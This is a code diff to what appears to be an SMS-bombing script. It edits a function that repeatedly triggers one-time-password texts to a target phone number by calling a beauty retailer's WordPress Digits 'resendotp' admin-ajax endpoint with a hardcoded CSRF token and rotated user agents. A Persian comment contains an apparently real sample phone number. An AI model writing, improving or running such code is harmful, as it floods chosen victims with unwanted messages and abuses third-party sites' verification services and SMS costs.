@@ -96,69 +96,16 @@ def Balad(phone):
 def nillarayeshi(phone):
     try:
         formatted_phone = "0" + phone.replace("+98", "")
-        session = requests.Session()
-        
-        # دریافت صفحه اصلی با غیرفعال کردن فشرده‌سازی
-        headers = {
-            "User-Agent": random.choice(user_agents),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "identity",  # غیرفعال کردن فشرده‌سازی
-            "Connection": "keep-alive",
-        }
-        
-        home_response = session.get(
-            "https://nillarayeshi.com/", 
-            timeout=15, 
-            headers=headers,
-            verify=False
-        )
-        home_response.encoding = 'utf-8'
-        
-        # استخراج خودکار توکن‌ها
-        def extract_token(pattern, token_name):
-            match = re.search(pattern, home_response.text)
-            if match:
-                token = match.group(1)
-                print(f'{g}[+] Found {token_name}: {token}{a}')
-                return token
-            else:
-                print(f'{r}[-] Could not find {token_name}{a}')
-                return "2a49f89a8f"  # fallback to default
-        
-        # استخراج توکن‌ها با الگوهای مختلف
-        csrf = extract_token(r'name="csrf" value="([^"]+)"', 'CSRF')
-        nonce = extract_token(r'name="dig_nounce" value="([^"]+)"', 'Nonce')
-        
-        # اگر توکن‌ها پیدا نشدن، از مقادیر پیشفرض استفاده کن
-        if csrf == "2a49f89a8f" and nonce == "2a49f89a8f":
-            print(f'{y}[!] Using default tokens{a}')
         
         url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
         
         payload = {
-            "action": "digits_check_mob",
+            "action": "digits_resendotp",  # تغییر action به digits_resendotp
             "countrycode": "+98",
-            "mobileNo": formatted_phone,
-            "csrf": csrf,
+            "mobileNo": formatted_phone.replace("0", "", 1),  # حذف صفر اول (9174444636)
+            "csrf": "2a49f89a8f",
             "login": "2",
-            "username": "",
-            "email": "",
-            "captcha": "",
-            "captcha_ses": "",
-            "digits": "1",
-            "json": "1",
-            "whatsapp": "0",
-            "digits_reg_name": "نام",
-            "digregcode": "+98",
-            "digits_reg_mail": formatted_phone,
-            "digregscode2": "+98",
-            "mobmail2": "",
-            "digits_reg_password": "",
-            "dig_otp": "",
-            "code": "",
-            "dig_reg_mail": "",
-            "dig_nounce": nonce
+            "whatsapp": "0"
         }
         
         headers = {
@@ -171,13 +118,13 @@ def nillarayeshi(phone):
             "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
         }
         
-        response = session.post(url, data=payload, headers=headers, timeout=15)
+        response = requests.post(url, data=payload, headers=headers, timeout=15)
         
         print(f'{y}[Debug] Status: {response.status_code}{a}')
         print(f'{y}[Debug] Response: {response.text}{a}')
         
         if response.status_code == 200:
-            if response.text.strip() == "1" or "success" in response.text.lower():
+            if response.text.strip() == "1":  # بررسی پاسخ "1"
                 print(f'{g}(nillarayeshi) Code Sent{a}')
                 return True
             else:
@@ -190,7 +137,6 @@ def nillarayeshi(phone):
     except Exception as e:
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
-
 
         
 # ==========================
